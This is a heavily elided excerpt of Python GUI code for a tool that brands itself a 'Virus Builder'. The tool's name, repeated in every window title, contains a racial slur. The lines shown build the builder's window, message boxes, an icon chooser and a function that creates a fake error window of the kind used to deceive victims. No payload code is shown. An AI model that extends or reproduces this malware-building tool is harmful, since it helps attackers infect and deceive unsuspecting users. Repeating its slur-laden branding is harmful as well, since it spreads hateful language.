...
try:
    ...
    builder = ctk.CTk()
    builder.title(f"ElliotNiggerson {version_tool} - Virus Builder")
    builder.geometry("800x600")
    builder.resizable(False, False)
    builder.configure(fg_color=colors["background"])
    builder.iconbitmap(os.path.join(tool_path, "Img", "Elliotniggerson_icon.ico"))
    ...
    def ErrorLogs(message):
        ...
        messagebox.showerror(f"ElliotNiggerson {version_tool} - Virus Builder", message)

    def InfoLogs(message):
        messagebox.showinfo(f"ElliotNiggerson {version_tool} - Virus Builder", message)
    ...
    def ChooseIcon():
        ...
        try:
            if sys.platform.startswith("win"):
                root = tkinter.Tk()
                root.iconbitmap(os.path.join(tool_path, "Img", "Elliotniggerson_icon.ico"))
                root.withdraw()
    ...
    def CreateFakeErrorWindow():
        ...
        fake_error_window.title(f"ElliotNiggerson {version_tool} - Fake Error")
